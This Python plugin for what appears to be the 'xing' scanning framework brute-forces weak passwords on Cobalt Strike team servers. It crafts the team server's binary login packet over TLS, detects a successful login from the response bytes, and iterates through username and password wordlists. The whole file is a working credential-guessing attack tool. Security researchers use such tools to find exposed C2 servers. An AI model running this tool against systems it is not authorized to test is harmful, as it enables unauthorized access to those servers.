from xing.core.BasePlugin import BasePlugin
from xing.core import PluginType, SchemeType
import ssl
import time


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.BRUTE
        self.scheme = [SchemeType.COBALT_STRIKE]
        self.vul_name = "CobaltStrike 弱口令"
        self.app_name = 'CobaltStrike'
        self.password_file = "password_csts.txt"
        self.username_file = "username_csts.txt"

    def gen_payload(self, pwd):
        payload = bytearray(
            b'\x00\x00\xbe\xef' +
            len(pwd).to_bytes(1, 'big', signed=True) +
            bytes(bytes(pwd, 'ascii').ljust(256, b'M'))
        )

        return payload

    def check_app(self, target):
        resp = self._login_cs("ThisIsNotAValidPassword")
        if resp == b'\x00\x00\xca\xfe' or resp == b'\x00\x00\x00\x00':
            return True

        return False

    def login(self, target, user, passwd):
        resp = self._login_cs(passwd)
        if resp == b'\x00\x00\xca\xfe':
            self.logger.success("{} Found password {}".format(target, passwd))
            return True
        time.sleep(0.2)
        return False

    def _login_cs(self, pwd):
        payload = self.gen_payload(pwd)
        sock = self.conn_target()
        ssl_ctx = ssl.SSLContext()
        ssl_sock = ssl_ctx.wrap_socket(sock)
        ssl_sock.send(payload)

        resp = b''
        while len(resp) < 4:
            data = ssl_sock.recv(4)
            if len(data) < 1:
                break
            resp += data

        ssl_sock.close()
        return resp
